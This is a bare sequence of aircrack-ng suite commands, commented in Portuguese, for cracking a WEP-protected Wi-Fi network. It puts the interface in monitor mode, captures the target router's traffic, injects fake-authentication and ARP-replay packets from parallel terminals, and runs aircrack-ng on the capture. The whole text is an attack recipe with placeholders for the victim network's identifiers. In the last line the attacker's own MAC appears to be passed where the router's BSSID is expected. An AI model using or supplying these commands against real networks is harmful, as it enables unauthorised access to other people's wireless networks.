#execução terminal [0]
	airmon-ng start <sua_interface>
	airodump-ng mon0
	airodump-ng --channel <canal_da_rede> --bssid <mac_roteador> -w wep1 mon0

#Executado em outro terminal ao mesmo tempo[1]
	aireplay-ng -1 0 -e <id_da_rede> -a <mac_roteador> -h <meu_mac> mon0
	aireplay-ng -3 -b <mac_roteador> -h <meu_mac> mon0

#Executado em outro terminal ao mesmo tempo[2]
	aireplay-ng -1 0 -e <id_da_rede> -a <mac_roteador> -h <meu_mac> mon0
	aircrack-ng -b <meu_mac> wep1-01.cap
